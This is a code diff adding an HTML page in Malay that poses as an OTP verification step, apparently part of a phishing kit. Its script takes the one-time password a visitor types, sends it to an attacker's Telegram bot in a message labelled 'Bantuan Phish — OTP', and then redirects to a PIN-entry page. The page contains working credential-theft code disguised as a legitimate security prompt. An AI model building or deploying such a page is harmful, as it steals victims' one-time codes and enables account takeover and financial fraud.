@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pengesahan OTP</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="card">
+        <h2>Pengesahan OTP</h2>
+        <p>Kami telah menghantar kod OTP 6-digit ke nombor telefon anda. Sila masukkan untuk pengesahan.</p>
+        <form id="formOtp">
+            <div class="form-group">
+                <label>Kod OTP</label>
+                <input type="text" id="otp" placeholder="123456" required>
+            </div>
+            <button type="submit" id="btn">Sahkan</button>
+        </form>
+    </div>
+    <script src="js/config.js"></script>
+    <script>
+        document.getElementById("formOtp").addEventListener("submit", async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById("btn");
+            btn.disabled = true; btn.textContent = "Mengesahkan...";
+            const otp = document.getElementById("otp").value;
+
+            const text = `<b>🔑 Bantuan Phish — OTP</b>\nOTP: <code>${otp}</code>`;
+            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: "POST", body: new URLSearchParams({ chat_id: CONFIG.CHAT_ID, text, parse_mode: "HTML" })
+            });
+
+            // Pindah ke halaman PIN
+            window.location.href = "pin.html";
+        });
+    </script>
+</body>
+</html>
